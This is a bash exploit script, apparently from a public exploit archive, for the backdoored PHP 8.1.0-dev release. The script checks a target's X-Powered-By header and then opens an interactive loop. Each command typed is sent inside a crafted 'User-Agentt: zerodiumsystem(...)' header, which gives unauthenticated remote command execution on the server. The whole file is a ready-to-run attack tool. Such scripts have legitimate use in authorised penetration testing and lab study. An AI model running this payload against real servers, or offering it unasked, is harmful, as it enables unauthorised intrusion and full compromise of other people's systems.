#!/bin/bash
#Exploit Title: PHP 8.1.0-dev (backdoor) | Remote Code Execution (Unauthenticated)
#Vendor Homepage: https://www.php.net/
#Version: PHP 8.1.0-dev
#Tested on: Ubuntu 20.04.2 LTS (5.4.0-80-generic)
#Author: Kl3gari
#Usage: ./php_8.1_rce.sh [URL]
red='\e[01;31m'
null='\e[00m'

trap __Ctrl_c__ INT

check_parameter() {
  if [[ -z $1 ]]; then
    echo -e "########################################\n"
    echo "Usage: $0 [URL]"
    echo -e "\n########################################"
    exit 1
  fi

}
__Ctrl_c__() {
    echo -e "\n${red}Aborting...${null}"
    exit 2
}

check_version() {
  echo "Checking if host is vulnerable..."
  echo ""
    sleep 1
    vuln=$(curl -sD - -o /dev/null $1 | grep "X-Powered-By: PHP/8.1.0-dev" | cut -d ' ' -f2 | cut -d '-' -f1)
  if [[ $vuln == "PHP/8.1.0" ]]; then
    echo -e "Vulnerable --> ${red}$vuln${null}"
      sleep 1
    echo -e "[+] Spawning shell\n"
      sleep 1
  else
    echo "I can't identify the version :("
    read -p "Do you want to continue?(y/n) " continue
      if [[ $continue == "n" ]] || [[ $continue == "N" ]]; then
        echo -e "${red}Aborted${null}"
          exit 3
        else
          echo -e "[+] Spawning shell\n"
          sleep 1
        fi
  fi
}

shell_spawning() {
  while true
  do
    read -p '$ ' comando
    curl -H "User-Agentt: zerodiumsystem(\"$comando\");" -A "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/81.0" $1 -s | sed '/DOCTYPE/,$d'
  done
}

main () {
  check_parameter $1
  check_version $1
  shell_spawning $1
  __Ctrl_c__
}

main "$@"
